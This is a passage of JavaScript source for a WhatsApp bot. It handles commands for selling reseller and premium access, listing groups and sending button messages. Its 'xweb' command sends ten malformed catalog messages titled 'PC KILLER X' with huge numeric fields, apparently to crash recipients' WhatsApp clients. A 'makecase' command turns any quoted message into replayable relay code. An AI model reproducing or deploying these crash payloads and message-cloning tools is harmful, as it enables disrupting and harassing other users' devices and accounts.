m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break

case "checkhost": {
	//
if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
XeonBotInc.relayMessage(m.chat, msg, {});
}
break

case 'addresell': case 'addreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addprem':
			case 'addpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram: t.me/ANUWH4YOU
WhatsApp: +94710695082`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await XeonBotInc.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await XeonBotInc.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: XeonBotInc.ments(addprem),
						externalAdReply: {
							title: `OWNER 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
							sourceUrl: link
						}
					}
				};
				return XeonBotInc.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delprem':
			case 'delpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram: t.me/ANUWH4YOU
WhatsApp: +94710695082`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break

case 'listprem':
case 'listpremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram: t.me/ANUWH4YOU
WhatsApp: +94710695082`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 0; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        XeonBotInc.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;

			
			case 'checkprem':
case 'checkpremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREMIUM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: XeonBotInc.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return XeonBotInc.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;


case 'self': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram: t.me/ANUWH4YOU
WhatsApp: +94710695082`);
}
XeonBotInc.public = false
replygcxeon('Success Change To Self Mode')
}
break

case 'public': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: https://youtube.com/@anuga_official
Telegram: t.me/ANUWH4YOU
WhatsApp: +94710695082`);
}
XeonBotInc.public = true
replygcxeon('Success Change To Public Mode')
}
break
case "listgc":{
	//
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break
case 'owner': {
const wokex = ownernomer // Extract the number part
const pushnamex = `${wokex}`
const kontak = {
"displayName": pushnamex,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${pushnamex}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
const oke = await XeonBotInc.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./XeonMedia/ANUGA-SENITHU.jpg"),
"mediaUrl": 'https://postimg.cc/nX6ZH38b',
"sourceUrl": `https://youtube.com/@dgxeon`
}}}, { quoted: m })
await XeonBotInc.sendMessage(m.chat, {audio: fs.readFileSync('./XeonMedia/sikma.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:oke})
}
break
case 'xweb':
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: XeonBotInc.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X Telegram : ANUWH4YOU`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: XeonBotInc.user.id,
quoted: null
})
XeonBotInc.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
	case 'ping': case 'runtime': case 'p': case 'botstatus': case 'statusbot': {
		//
                const speed = require('performance-now')
const { performance } = require('perf_hooks')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
𝐵𝑂𝑇 𝑆𝑃𝐸𝐸𝐷 🚀: ${latensi.toFixed(4)}M⃟S ⚡`.trim()
                replygcxeon(respon)
            }
            break
case 'makecase':
//
if (!m.quoted) return replygcxeon('Reply to a message to make a case of it!');
кибар = q.split(' ')[0];
if (!кибар) {
        return replygcxeon(`Example Usage: ${prefix+command} abc`);
    }    
const kak = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
replygcxeon (`case '${кибар}': 
if (!isBot && !isCreator) return
try {
var ${кибар} = generateWAMessageFromContent(from, proto.Message.fromObject(${kak}),{ userJid: from })
XeonBotInc.relayMessage(from, ${кибар}.message, {messageId: ${кибар}.key.id })
} catch (e) {
console.log(e)
}
break`)
break

case 'tesb': {
  let msgs = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `hui`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...await prepareWAMessageMedia(
              { image: fs.readFileSync('./XeonMedia/donate.jpg') },
              { upload: XeonBotInc.waUploadToServer }
            )
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "Call Owner",
                  phone_number: "+1234567890" // Replace with the actual phone number
                })
              }
            ]
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: idch,
              newsletterName: ownername,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, { quoted: m });

  return await XeonBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

	
	case "tesmen": case "backtomenu": {
  const imageUrl = "https://postimg.cc/nX6ZH38b"; // Define the single image URL

  caption = `tes`

  // Main buttons
  const buttons = [
    {
      buttonId: ".menu",
      buttonText: { 
      displayText: "Xeon" 
      }
    },
    {
      buttonId: "xownermenu",
      buttonText: { 
      displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮" 
      }
    },
    {
      buttonId: "tapmenu",
      buttonText: { 
      displayText: "𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞" 
      }
    }
  ];

  // Single select button (flow action)
  const flowActions = [
    {
      buttonId: "singleSelect",
      buttonText: { displayText: "𝐒𝐢𝐧𝐠𝐥𝐞 𝐒𝐞𝐥𝐞𝐜𝐭" },
      type: 4, // Indicates a flow action
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "Select an Option",
          sections: [
            {
              title: "Main Options",
              rows: [
                {
                  title: "Credits And Special Thanks",
                  description: " ",
                  id: "credits"
                },
                {
                  title: "Option 2",
                  description: "Description for Option 2",
                  id: "ping"
                }
              ]
            }
          ]
        })
      }
    }
  ];

  // Add flow actions to the buttons array
  buttons.push(...flowActions);

  XeonBotInc.sendMessage(m.chat, {
    image: { url: imageUrl }, // Single image URL used for the message
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons,
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363399531796033@newsletter", // Use the newsletterJid here
        newsletterName: `ok`
      }
    }
  }, {quoted:m});
}
break;

case 'getmtype': {
	//
    if (!m.quoted) return replygcxeon('Reply to a message to debug its mtype!');
    const quotedMtype = m.quoted.mtype || 'Unknown';
    console.log(`Quoted Message Type: ${quotedMtype}`);
    await replygcxeon(`Quoted Message Type: ${quotedMtype}`);
    }
break;

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
